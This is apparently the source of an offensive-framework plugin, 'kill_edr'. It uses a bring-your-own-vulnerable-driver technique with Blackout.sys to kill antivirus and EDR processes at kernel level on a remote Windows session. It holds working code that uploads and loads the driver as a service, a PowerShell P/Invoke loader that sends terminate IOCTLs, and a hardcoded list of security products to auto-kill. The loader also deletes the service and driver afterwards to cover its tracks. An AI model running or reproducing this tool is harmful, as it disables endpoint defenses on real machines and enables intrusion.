"""
kill_edr — BYOVD EDR/AV process terminator

Uses Blackout.sys (BYOVD — vulnerable Micro-Star MSI Afterburner driver)
to terminate AV/EDR processes that are protected at the kernel level and
cannot be killed from user-mode even with SeDebugPrivilege.

MITRE: T1562.001 (Impair Defenses: Disable or Modify Tools)
       T1068     (Exploitation for Privilege Escalation — kernel arbitrary kill)
Wire:  driver dropped via upload command, loader via PowerShell P/Invoke
"""

import base64
import os
from pathlib import Path

from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.context import PluginContext
from fitnah.sdk.result import ModuleResult
from fitnah.sdk.schema import Param, ParamSchema

_DRIVER_PATH = Path(__file__).parent.parent.parent / "drivers" / "byovd" / "Blackout.sys"

# IOCTLs from ZeroMemoryEx/Blackout
_IOCTL_INIT      = 0x9876C004
_IOCTL_TERMINATE = 0x9876C094

# Well-known AV/EDR process names
_KNOWN_EDR = [
    "MsMpEng.exe",       # Windows Defender
    "MsSense.exe",       # Microsoft Defender for Endpoint
    "SentinelAgent.exe", # SentinelOne
    "SentinelServiceHost.exe",
    "CylanceSvc.exe",    # Cylance
    "CbDefense.exe",     # Carbon Black
    "cb.exe",
    "CrowdStrike.exe",   # CrowdStrike Falcon
    "CSFalconService.exe",
    "CSFalconContainer.exe",
    "bdservicehost.exe", # Bitdefender
    "bdagent.exe",
    "mcshield.exe",      # McAfee
    "mfetp.exe",
    "savservice.exe",    # Sophos
    "hmpalert.exe",      # HitmanPro.Alert
    "mbamservice.exe",   # Malwarebytes
    "ekrn.exe",          # ESET
    "egui.exe",
]

_PS_LOADER = r"""
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class KernelKill {{
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwAccess,
        uint dwShareMode, IntPtr lpSecurity, uint dwCreation,
        uint dwFlags, IntPtr hTemplate);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode,
        ref uint lpInBuffer, uint nInBufferSize,
        IntPtr lpOutBuffer, uint nOutBufferSize,
        out uint lpBytesReturned, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}}
'@

# ── Load driver via SCM ───────────────────────────────────────────────────────
$svcName = "Blk{rand}"
$drvPath = "{drvpath}"

$scm = [System.ServiceProcess.ServiceController]::new
$null = & sc.exe create $svcName type= kernel binPath= $drvPath start= demand error= ignore 2>&1
$null = & sc.exe start $svcName 2>&1

Start-Sleep -Milliseconds 500

# ── Open device handle ────────────────────────────────────────────────────────
$hDev = [KernelKill]::CreateFile("\\\\.\\\Blackout",
    [uint32]0xC0000000, [uint32]0, [IntPtr]::Zero,
    [uint32]3, [uint32]0x80, [IntPtr]::Zero)

if ($hDev -eq [IntPtr]([int]-1)) {{
    & sc.exe stop   $svcName 2>&1 | Out-Null
    & sc.exe delete $svcName 2>&1 | Out-Null
    Remove-Item -Force "{drvpath}" -ErrorAction SilentlyContinue
    Write-Output "ERROR: failed to open device handle (gle=$([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    exit 1
}}

# ── Initialize driver with target PID ────────────────────────────────────────
$pid_val = [uint32]{pid}
$bret    = [uint32]0
$ok = [KernelKill]::DeviceIoControl($hDev, [uint32]{ioctl_init},
    [ref]$pid_val, [uint32]4, [IntPtr]::Zero, [uint32]0, [ref]$bret, [IntPtr]::Zero)

if (-not $ok) {{
    [KernelKill]::CloseHandle($hDev) | Out-Null
    & sc.exe stop   $svcName 2>&1 | Out-Null
    & sc.exe delete $svcName 2>&1 | Out-Null
    Remove-Item -Force "{drvpath}" -ErrorAction SilentlyContinue
    Write-Output "ERROR: INITIALIZE IOCTL failed (gle=$([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    exit 1
}}

# ── Send terminate IOCTL ──────────────────────────────────────────────────────
$ok2 = [KernelKill]::DeviceIoControl($hDev, [uint32]{ioctl_kill},
    [ref]$pid_val, [uint32]4, [IntPtr]::Zero, [uint32]0, [ref]$bret, [IntPtr]::Zero)

[KernelKill]::CloseHandle($hDev) | Out-Null

# ── Cleanup ───────────────────────────────────────────────────────────────────
Start-Sleep -Milliseconds 300
& sc.exe stop   $svcName 2>&1 | Out-Null
& sc.exe delete $svcName 2>&1 | Out-Null
Remove-Item -Force "{drvpath}" -ErrorAction SilentlyContinue

if ($ok2) {{ Write-Output "OK: pid {pid} terminated" }}
else      {{ Write-Output "ERROR: TERMINATE IOCTL failed (gle=$([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }}
"""


class KillEdr(BasePlugin):
    NAME        = "kill_edr"
    DESCRIPTION = "BYOVD kernel-level AV/EDR process terminator (Blackout.sys / MSI Afterburner)"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"

    schema = ParamSchema().add(
        Param("target",   str,  required=False, default="",
              help="Process name (e.g. MsMpEng.exe) or PID integer. "
                   "Omit to auto-detect and kill all known AV/EDR processes."),
        Param("list_edr", bool, required=False, default=False,
              help="List known AV/EDR process names without killing"),
    )

    def run(self, session, params, ctx: PluginContext = None) -> ModuleResult:
        if params.get("list_edr"):
            return ModuleResult.ok("\n".join(_KNOWN_EDR))

        if not _DRIVER_PATH.exists():
            return ModuleResult.err(
                f"Blackout.sys not found at {_DRIVER_PATH}. "
                "Run: git submodule update / check fitnah/drivers/byovd/"
            )

        if ctx is None:
            return ModuleResult.err("Requires live session")

        target = params.get("target", "")

        # Resolve target PIDs
        pids_to_kill = self._resolve_targets(target, ctx)
        if isinstance(pids_to_kill, ModuleResult):
            return pids_to_kill
        if not pids_to_kill:
            return ModuleResult.err("No target AV/EDR processes found running")

        # Upload driver binary to temp path on target
        import random, string
        rand_name = "".join(random.choices(string.ascii_lowercase, k=6))
        drv_remote = f"C:\\Windows\\Temp\\{rand_name}.sys"
        drv_data   = base64.b64encode(_DRIVER_PATH.read_bytes()).decode()

        r = ctx.upload(drv_remote, drv_data)
        if r.get("status") != "ok":
            return ModuleResult.err(f"Driver upload failed: {r}")

        results = []
        for pid in pids_to_kill:
            script = _PS_LOADER.format(
                rand      = rand_name,
                drvpath   = drv_remote,
                pid       = pid,
                ioctl_init = _IOCTL_INIT,
                ioctl_kill = _IOCTL_TERMINATE,
            )
            r = ctx.ps(script)
            output = r.get("output", "")
            results.append(f"PID {pid}: {output.strip()}")
            if "ERROR" in output:
                break

        return ModuleResult.ok("\n".join(results))

    # ── helpers ──────────────────────────────────────────────────────────────

    def _resolve_targets(self, target: str, ctx: PluginContext):
        """Return list of PIDs to terminate."""
        if target:
            # Numeric PID
            if target.isdigit():
                return [int(target)]
            # Process name — find its PID
            r = ctx.exec(f"tasklist /FI \"IMAGENAME eq {target}\" /FO CSV /NH")
            output = r.get("output", "")
            pids = self._parse_tasklist_pids(output, target)
            if not pids:
                return ModuleResult.err(f"Process not found: {target}")
            return pids

        # Auto-detect all running known AV/EDR
        r = ctx.exec("tasklist /FO CSV /NH")
        output = r.get("output", "")
        pids = []
        for edr_name in _KNOWN_EDR:
            found = self._parse_tasklist_pids(output, edr_name)
            pids.extend(found)
        return pids

    @staticmethod
    def _parse_tasklist_pids(tasklist_output: str, process_name: str) -> list:
        """Parse PIDs from tasklist /FO CSV output."""
        pids = []
        for line in tasklist_output.splitlines():
            parts = [p.strip('"') for p in line.split(",")]
            if len(parts) >= 2 and parts[0].lower() == process_name.lower():
                try:
                    pids.append(int(parts[1]))
                except ValueError:
                    pass
        return pids
